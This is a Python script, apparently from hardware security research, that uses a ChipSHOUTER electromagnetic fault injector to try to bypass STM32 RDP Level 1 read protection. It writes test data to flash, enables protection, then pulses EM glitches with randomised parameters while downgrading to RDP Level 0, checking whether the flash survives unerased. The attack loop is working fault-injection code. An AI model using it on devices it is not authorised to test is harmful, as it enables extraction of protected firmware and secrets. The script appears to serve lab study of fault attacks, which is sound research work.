#!/usr/bin/env python3
"""
STM32 Nucleo RDP (Read Protection) Demo Script
This script demonstrates setting RDP level 1 and verifying read protection.
"""

import subprocess
import sys
import time
import os
from pathlib import Path
from chipshouter import ChipSHOUTER
import threading
import random

# EEPROM/Data Flash addresses from your table
eeprom_bank1_start = "0x08080000"
eeprom_bank1_end = "0x08080BFF"   # 3KB
eeprom_bank2_start = "0x08080C00" 
eeprom_bank2_end = "0x080817FF"    # 3KB

# Total EEPROM size (both banks)
eeprom_size = "0x1800"  # 6KB total

# memo mode = 0, Boot0 = 0, UFB = 0
bank_1_start = "0x08000000"  # Flash start address
bank_1_end = "0x08017FFF"
bank_2_start = "0x08018000"
bank_2_end = "0x0802FFFF"

option_bytes_address = "0x1FF80000"

read_size = "0x18000"  #  96kbytes

verbose = False

test_data = bytearray()
test_data.extend(b"SIMON_SIMON_SIMO")  # 16 bytes


def arm_chipshouter(cs, voltage=400, width=160, repeat=10, deadtime=1):
    try:
        # reset fault
        print(f"Arming chipshouter with voltage: {voltage}, width: {width}, repeat: {repeat}, deadtime: {deadtime}")
        print(f"Current temperature: {cs.temperature_diode} {cs.temperature_mosfet} {cs.temperature_xformer}")
        cs.faults_current = 0 
        cs.voltage = voltage
        cs.pulse.width = width
        cs.armed = 1
        cs.pulse.repeat = repeat
        cs.pulse.deadtime = deadtime
        time.sleep(0.1)
    except Exception as e:
        print(f"Error arming chipshouter: {e}")
        return False
    return True

def glitch_on(cs, pulse=10):
    # print(cs) #get all values of device
    cs.pulse = pulse
    time.sleep(1)
    cs.armed = 0
    time.sleep(1)

def run_command(cmd, description=""):
    """Execute a command and handle errors"""
    if verbose:
        print(f"\n{'='*50}")
        if description:
            print(f"Step: {description}")
        print(f"Command: {' '.join(cmd)}")
        print(f"{'='*50}")
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        if verbose:
            print("STDOUT:", result.stdout)
            if result.stderr:
                print("STDERR:", result.stderr)
        return result
    except subprocess.CalledProcessError as e:
        print(f"ERROR: Command {' '.join(cmd)} failed with return code {e.returncode}")
        print("STDOUT:", e.stdout)
        print("STDERR:", e.stderr)
        return None
    except FileNotFoundError:
        print(f"ERROR: Command not found. Make sure ST-Link tools are installed and in PATH.")
        return None


def read_flash(description="", print_binary_file_location=True):
    """Read flash memory"""
    output_file = f"flash_read_{int(time.time())}.bin"
    cmd = ['st-flash', '--format', 'binary', 'read', output_file, bank_1_start, '0x18000']
    result = run_command(cmd, f"Reading flash memory {description}")
    if print_binary_file_location:
        print(f"Binary file location: {output_file}")
    if result and os.path.exists(output_file):
        with open(output_file, 'rb') as f:
            data = f.read()
        return data
    
    return None

def write_flash(description=""):
    """Write EEPROM memory"""
    output_file = f"fflash_write_{int(time.time())}.bin"
    with open(output_file, 'wb') as f:
        f.write(test_data)
    cmd = ['st-flash', '--format', 'binary', 'write', output_file, bank_1_start]
    result = run_command(cmd, f"Writing flash memory {description}")
    return result

def check_tools():
    """Check if required tools are available"""
    tools = ['st-flash', 'st-info']
    missing_tools = []
    
    for tool in tools:
        result = subprocess.run(['which', tool], capture_output=True)
        if result.returncode != 0:
            missing_tools.append(tool)
    
    if missing_tools:
        print("ERROR: Missing required tools:")
        for tool in missing_tools:
            print(f"  - {tool}")
        print("\nPlease install ST-Link tools:")
        print("  Ubuntu/Debian: sudo apt install stlink-tools")
        print("  macOS: brew install stlink")
        print("  Or download from: https://github.com/stlink-org/stlink")
        return False
    
    return True

def get_device_info():
    """Get STM32 device information"""
    cmd = ['st-info', '--probe']
    return run_command(cmd, "Getting device information")

def read_option_bytes(print_result=False):
        """Read current option bytes to check RDP level"""
        cmd = ['st-flash', '--format', 'binary', 'read', 'option_bytes.bin', option_bytes_address, '0x10']
        result = run_command(cmd, "Reading option bytes")
        
        if result and os.path.exists('option_bytes.bin'):
            try:
                with open('option_bytes.bin', 'rb') as f:
                    data = f.read()
                rdp_byte = data[0] if len(data) > 0 else 0
                if rdp_byte == 0xAA:
                    if print_result:
                        print("RDP Level 0 (No protection)")
                elif rdp_byte == 0x33:
                    if print_result:
                        print("RDP Level 1 (Read protection enabled)")
                elif rdp_byte == 0xCC:
                    if print_result:
                        print("RDP Level 2 (Chip protection - IRREVERSIBLE!)")
                else:
                    if print_result:
                        print(f"Unknown RDP level: 0x{rdp_byte:02X}")
                return rdp_byte
            except Exception as e:
                print(f"Error reading option bytes file: {e}")
        return None

def set_rdp_level_1():
    """Set RDP to level 1"""
    if verbose:
        print("\n" + "!"*60)
        print("WARNING: Setting RDP Level 1 will enable read protection!")
        print("This will prevent reading flash memory via debug interface.")
        print("To disable, you'll need to perform a mass erase (which erases all flash).")
        print("!"*60)
    
    # Read current option bytes first
    current_rdp = read_option_bytes()
    if current_rdp is None:
        print("Failed to read current option bytes")
        return False
    
    if current_rdp == 0x33:
        print("RDP Level 1 is already set!")
        return True
    
    try:
        # Read current option bytes data
        with open('option_bytes.bin', 'rb') as f:
            current_data = f.read()
        
        # Create new option bytes with RDP Level 1
        new_data = bytearray(current_data)
        new_data[0] = 0x33  # RDP Level 1
        new_data[1] = 0xCC  # RDP complement
        
        if verbose:
            print(f"Current option bytes: {current_data.hex()}")
            print(f"New option bytes:     {new_data.hex()}")
        
        # Write to file first
        with open('new_option_bytes.bin', 'wb') as f:
            f.write(new_data)
        
        # Use file-based write
        cmd = ['st-flash', '--format', 'binary', 'write', 'new_option_bytes.bin', option_bytes_address]
        if verbose:
            print(f"SENDING command: {' '.join(cmd)}")
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if verbose:
            print("STDOUT:", result.stdout)
            print("STDERR:", result.stderr)
        
        if result.returncode == 0:
            print("RDP Level 1 set successfully!")
            print("Device will reset...")
            time.sleep(2)
            return True
        else:
            print(f"Failed to set RDP Level 1. Return code: {result.returncode}")
            return False
            
    except Exception as e:
        print(f"Error setting RDP: {e}")
        return False
    finally:
        # Clean up temporary file
        if os.path.exists('new_option_bytes.bin'):
            os.remove('new_option_bytes.bin')

def set_rdp_level_0(fast=False):
    """Set RDP to level 0"""
    if verbose:
        print("\n" + "!"*60)
        print("WARNING: Setting RDP Level 0 will disable read protection!")
        print("This will allow reading flash memory via debug interface.")
        print("To enable, you'll need to perform a mass erase (which erases all flash).")
        print("!"*60)

    # Read current option bytes first
    current_rdp = read_option_bytes()
    if current_rdp is None:
        print("Failed to read current option bytes")
        return False

    if current_rdp == 0xAA:
        print("RDP Level 0 is already set!")
        return True

    try:
        # Read current option bytes data
        with open('option_bytes.bin', 'rb') as f:
            current_data = f.read()
        
        # Create new option bytes with RDP Level 0
        new_data = bytearray(current_data)
        new_data[0] = 0xAA  # RDP Level 0
        new_data[1] = 0x55  # RDP complement
        
        if verbose:
            print(f"Current option bytes: {current_data.hex()}")
            print(f"New option bytes:     {new_data.hex()}")
        
        # Write to file first
        with open('new_option_bytes.bin', 'wb') as f:
            f.write(new_data)
        
        # Use file-based write
        cmd = ['st-flash', '--format', 'binary', 'write', 'new_option_bytes.bin', option_bytes_address]
        if verbose:
            print(f"SENDING command: {' '.join(cmd)}")
        
        result = subprocess.run(cmd, capture_output=not fast, text=not fast)

        if fast:
            return True
        
        if verbose:
            print("STDOUT:", result.stdout)
            print("STDERR:", result.stderr)
        
        if result.returncode == 0:
            print("RDP Level 0 set successfully!")
            print("Device will reset...")
            time.sleep(2)
            return True
        else:
            print(f"Failed to set RDP Level 0. Return code: {result.returncode}")
            return False
            
    except Exception as e:
        print(f"Error setting RDP: {e}")
        return False
    finally:
        # Clean up temporary file
        if os.path.exists('new_option_bytes.bin'):
            os.remove('new_option_bytes.bin')

def reset_device():
    """Reset the device"""
    cmd = ['st-flash', 'reset']
    return run_command(cmd, "Resetting device")


def check_data_0(data):
    # Check if all bytes are 0x00
    all_zeros = all(b == 0 for b in data)
    non_zero_count = sum(1 for b in data if b != 0)
    
    if verbose:
        print(f"Read {len(data)} bytes")
        print(f"Non-zero bytes: {non_zero_count}/{len(data)}")
        print(f"All zeros: {all_zeros}")
    
    return all_zeros

def check_data_write(data):
    # checking that data is same as test_data
    return data[:16] == test_data

def data_print_first_32_bytes(data):
    print("First 32 bytes:", ' '.join(f'{b:02X}' for b in data[:32]))

def data_to_ascii(data):
    return ''.join(chr(b) for b in data)

def check_data_protected(data):
    # checking that data is all 0x00
    # 8000550103000301000000000000ffff
    data_expected = bytearray(b"\x80\x00\x55\x01\x03\x00\x03\x01\x00\x00\x00\x00\x00\x00\xff\xff")
    if verbose:
        print("Expected data:", data_to_ascii(data_expected))
        print("Actual data:", data_to_ascii(data))
        print("data: ", data)
    return data[:16] == data_expected


def run_whole_glitch(cs, voltage=300, width=100, repeat=10, deadtime=1):
    arm_chipshouter(cs, voltage=voltage, width=width, repeat=repeat, deadtime=deadtime)
    
    if not check_tools():
        return False
    get_device_info()

    set_rdp_level_0()
    time.sleep(0.1)
    write_flash()
    reset_device()
    time.sleep(0.1)

    data_after = read_flash("after writing to flash")
    ok_after_write = check_data_write(data_after)
    if not ok_after_write:
        print("Failed to write data to flash!")
        return False

    # Set RDP Level 1
    set_rdp_level_1()
    reset_device()
    time.sleep(0.1)

    # check if we cant read flash
    data_after = read_flash("after writing to flash")
    ok_after_write = check_data_protected(data_after)
    if not ok_after_write:
        print("Failed to read data to flash!")
        return False
    for i in range(0):
        print(f"{i}")
        time.sleep(1)
    
    # now setting rdp0 
    ## GLITCH HERE!!!!! 
    # exec glitch in seperate thread
    glitch_thread = threading.Thread(target=glitch_on, args=(cs, 1))
    glitch_thread.start()
    set_rdp_level_0(fast=True)
    #### GLITCH HERE!!!!! 

    # make sure data is all 0 now
    data_after = read_flash("(after RDP)", print_binary_file_location=True)
    has_to_be_0 = check_data_0(data_after)
    if not has_to_be_0:
        # if not all 0 check if data is same as test_data
        if check_data_write(data_after):
            print("GLITCH WORKED!")
            print(data_to_ascii(data_after))
            return True
        else:
            print("GLITCH PROGRESS! We blasted the sram")
            return False
    else:
        print("GLITCH FAILED! All 0x00")
        return False

def run_demo():
    print("STM32 Nucleo RDP (Read Protection) Demo")
    print("="*50)

    cs = ChipSHOUTER(comport='/dev/cu.usbserial-NA4PPWV9')
    for i in range(10):
        width = random.randint(10, 200)
        repeat = random.randint(1, 20)
        deadtime = random.randint(1, 10)
        run_whole_glitch(cs, voltage=400, width=width, repeat=repeat, deadtime=deadtime)
        time.sleep(1)

    
    return True

if __name__ == "__main__":
    run_demo()